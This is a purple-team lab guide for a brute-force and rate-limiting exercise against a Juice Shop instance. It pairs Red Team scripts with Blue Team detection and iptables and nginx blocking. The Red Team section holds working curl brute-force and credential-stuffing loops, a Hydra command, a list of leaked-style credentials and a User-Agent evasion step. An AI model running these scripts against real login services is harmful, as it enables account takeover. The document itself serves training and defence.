# Purple Team Exercise 02: Brute Force & Rate Limiting

## 🎯 Overview

**Duration:** 40 minutes  
**Difficulty:** ⭐ Beginner  
**OWASP Category:** A07:2021 - Identification and Authentication Failures

Red Team will conduct brute force attacks against user accounts while Blue Team monitors login attempts and implements rate limiting to stop the attack.

---

## ⏱️ Timeline

| Time | Red Team Activity | Blue Team Activity |
|------|-------------------|-------------------|
| 0-5 min | Prepare wordlists | Setup login monitoring |
| 5-20 min | Brute force attacks | Detect failed logins |
| 20-30 min | Credential stuffing | Implement rate limiting |
| 30-40 min | Test defenses | Verify protection & report |

---

## 🔴 Red Team Instructions

### Target
```
http://<VPS_IP>:8000
```

### Phase 1: Preparation (5 minutes)

**Objective:** Create password lists and identify targets

#### 1. Create Password Wordlist

```bash
cat > passwords.txt << 'EOF'
admin
password
123456
admin123
password123
juice
shop
letmein
welcome
qwerty
EOF
```

#### 2. Create Username List

```bash
cat > users.txt << 'EOF'
admin@juice-sh.op
jim@juice-sh.op
bender@juice-sh.op
customer@juice-sh.op
test@test.com
EOF
```

#### 3. Identify Login Endpoint

```bash
# The login endpoint
# POST /rest/user/login
# Body: {"email": "...", "password": "..."}
```

---

### Phase 2: Brute Force Attack (15 minutes)

**Objective:** Attempt to crack user passwords

#### Simple Bash Brute Force

```bash
#!/bin/bash
TARGET="http://<VPS_IP>:8000"
EMAIL="admin@juice-sh.op"

echo "Starting brute force against $EMAIL"

while read password; do
    echo -n "Trying: $password... "
    
    RESPONSE=$(curl -s -X POST "$TARGET/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$EMAIL\",\"password\":\"$password\"}")
    
    if echo "$RESPONSE" | grep -q "token"; then
        echo "SUCCESS! Password: $password"
        echo "$RESPONSE"
        break
    else
        echo "Failed"
    fi
    
    sleep 0.5  # Small delay to be visible in logs
done < passwords.txt
```

Save and run:
```bash
chmod +x brute_force.sh
./brute_force.sh
```

#### Try Multiple Users

```bash
#!/bin/bash
TARGET="http://<VPS_IP>:8000"

while read email; do
    echo "=== Attacking: $email ==="
    
    while read password; do
        RESPONSE=$(curl -s -X POST "$TARGET/rest/user/login" \
            -H "Content-Type: application/json" \
            -d "{\"email\":\"$email\",\"password\":\"$password\"}")
        
        if echo "$RESPONSE" | grep -q "token"; then
            echo "CRACKED! $email : $password"
            break
        fi
        sleep 0.3
    done < passwords.txt
    
done < users.txt
```

#### Using Hydra (if installed)

```bash
# HTTP POST form attack
hydra -l admin@juice-sh.op -P passwords.txt \
    <VPS_IP> http-post-form \
    "/rest/user/login:email=^USER^&password=^PASS^:Invalid"
```

---

### Phase 3: Credential Stuffing (10 minutes)

**Objective:** Try known leaked credentials

Create a combo list:
```bash
cat > combos.txt << 'EOF'
admin@juice-sh.op:admin123
admin@juice-sh.op:password
jim@juice-sh.op:ncc-1701
bender@juice-sh.op:bender
mc.safesearch@juice-sh.op:Mr. N00dles
EOF
```

Attack with combo list:
```bash
#!/bin/bash
TARGET="http://<VPS_IP>:8000"

while IFS=: read email password; do
    echo -n "Trying $email:$password... "
    
    RESPONSE=$(curl -s -X POST "$TARGET/rest/user/login" \
        -H "Content-Type: application/json" \
        -d "{\"email\":\"$email\",\"password\":\"$password\"}")
    
    if echo "$RESPONSE" | grep -q "token"; then
        echo "SUCCESS!"
    else
        echo "Failed"
    fi
    
    sleep 0.5
done < combos.txt
```

**Hint:** One of Jim's passwords relates to Star Trek 🖖

---

### Phase 4: Test Defenses (10 minutes)

- Try to continue attacks after Blue Team implements blocks
- Document if/when you get rate-limited
- Try from different user agents or with delays

```bash
# Try with different User-Agent
curl -s -X POST "http://<VPS_IP>:8000/rest/user/login" \
    -H "Content-Type: application/json" \
    -H "User-Agent: Mozilla/5.0 (iPhone; CPU iPhone OS 14_0)" \
    -d '{"email":"admin@juice-sh.op","password":"test"}'
```

---

### Red Team Deliverables

- [ ] Number of credentials cracked
- [ ] List of valid email/password pairs found
- [ ] Time until blocked (if blocked)
- [ ] Methods that bypassed protection

---

## 🔵 Blue Team Instructions

### Phase 1: Setup Monitoring (5 minutes)

**Objective:** Monitor login attempts

#### 1. Watch Login Endpoint

```bash
# Monitor login attempts in real-time
tail -f ./logs/nginx/access.log | grep -i "/rest/user/login"
```

#### 2. Create Failed Login Alert

Open a second terminal:
```bash
# Count failed logins (non-200 responses)
watch -n 5 'grep "POST /rest/user/login" ./logs/nginx/access.log | grep -v " 200 " | wc -l'
```

#### 3. In Kibana

Create a search for login activity:
```
message: *login* AND NOT response:200
```

---

### Phase 2: Detect Brute Force (15 minutes)

**Objective:** Identify the attack in progress

#### Detection Script

```bash
#!/bin/bash
LOG_FILE="./logs/nginx/access.log"
THRESHOLD=10  # Alert after 10 failed logins

while true; do
    # Count failed logins per IP in last 60 seconds
    echo "=== Failed Login Check $(date) ==="
    
    # Get IPs with failed logins
    grep "POST /rest/user/login" "$LOG_FILE" | \
        grep " 401 " | \
        awk '{print $1}' | \
        sort | uniq -c | sort -rn | head -5
    
    # Alert if threshold exceeded
    FAILED_COUNT=$(grep "POST /rest/user/login" "$LOG_FILE" | grep " 401 " | wc -l)
    
    if [ $FAILED_COUNT -gt $THRESHOLD ]; then
        echo "⚠️  ALERT: $FAILED_COUNT failed login attempts detected!"
    fi
    
    sleep 10
done
```

#### Identify Attack Patterns

```bash
# Find IPs with most login attempts
grep "POST /rest/user/login" ./logs/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn

# Check request timing (rapid requests = bot)
grep "POST /rest/user/login" ./logs/nginx/access.log | \
    awk '{print $4}' | tail -20
```

#### Signs of Brute Force

| Indicator | Meaning |
|-----------|---------|
| Many 401 from one IP | Password guessing |
| Rapid requests (<1s apart) | Automated attack |
| Same endpoint repeatedly | Targeted attack |
| Different passwords, same user | Brute force |
| Different users, common passwords | Password spray |

---

### Phase 3: Implement Rate Limiting (10 minutes)

**Objective:** Block the brute force attack

#### Option 1: Block Attacker IP

```bash
# Get attacker IP
ATTACKER=$(grep "POST /rest/user/login" ./logs/nginx/access.log | \
    awk '{print $1}' | sort | uniq -c | sort -rn | head -1 | awk '{print $2}')

echo "Blocking IP: $ATTACKER"

# Block with iptables
sudo iptables -A INPUT -s $ATTACKER -j DROP
```

#### Option 2: Rate Limit in Nginx

Create rate limiting config:
```bash
cat > ./blue-team/config/rate_limit.conf << 'EOF'
# Rate limiting zone (10 requests per second)
limit_req_zone $binary_remote_addr zone=login:10m rate=10r/s;

# Apply to login endpoint
location /rest/user/login {
    limit_req zone=login burst=5 nodelay;
    limit_req_status 429;
    
    proxy_pass http://juice-shop:3000;
}
EOF
```

#### Option 3: Quick Block with Fail2Ban Style

```bash
#!/bin/bash
# Simple auto-blocker
LOG="./logs/nginx/access.log"
MAX_ATTEMPTS=15

while true; do
    # Find IPs with too many failed logins
    grep "POST /rest/user/login" "$LOG" | grep " 401 " | \
        awk '{print $1}' | sort | uniq -c | \
        while read count ip; do
            if [ "$count" -gt "$MAX_ATTEMPTS" ]; then
                if ! iptables -C INPUT -s "$ip" -j DROP 2>/dev/null; then
                    echo "Blocking $ip ($count attempts)"
                    sudo iptables -A INPUT -s "$ip" -j DROP
                fi
            fi
        done
    sleep 5
done
```

---

### Phase 4: Verify & Report (10 minutes)

#### Verify Block is Working

```bash
# Check if attacks stopped
tail -f ./logs/nginx/access.log | grep "/rest/user/login"

# If blocked correctly, you should see no new attempts
```

#### Document the Incident

```markdown
BRUTE FORCE INCIDENT REPORT
===========================

Detection Time: [TIME]
Attacker IP: [IP]
Attack Duration: [MINUTES]

Attack Statistics:
- Total login attempts: [COUNT]
- Failed attempts: [COUNT]
- Successful logins: [COUNT]
- Accounts targeted: [LIST]

Response Timeline:
- [TIME] - Attack started
- [TIME] - Attack detected
- [TIME] - Rate limiting applied
- [TIME] - IP blocked
- [TIME] - Attack stopped

Accounts Potentially Compromised:
- [LIST ANY 200 RESPONSES]

Recommendations:
1. Force password reset for targeted accounts
2. Implement account lockout policy
3. Add CAPTCHA after 3 failed attempts
4. Consider 2FA for all users
```

---

## 🟣 Debrief Questions

Discuss as a team:

1. **Red Team:** How many passwords did you crack? What was the success rate?
2. **Blue Team:** How quickly did you detect the attack?
3. **Both:** What's the difference between brute force and password spraying?
4. **Both:** How would 2FA have prevented this attack?

---

## ✅ Success Criteria

### Red Team
- [ ] Successfully cracked at least 1 account
- [ ] Identified valid usernames
- [ ] Tested multiple attack methods

### Blue Team
- [ ] Detected brute force within 5 minutes
- [ ] Identified correct attacker IP
- [ ] Implemented rate limiting or blocking
- [ ] Documented the incident
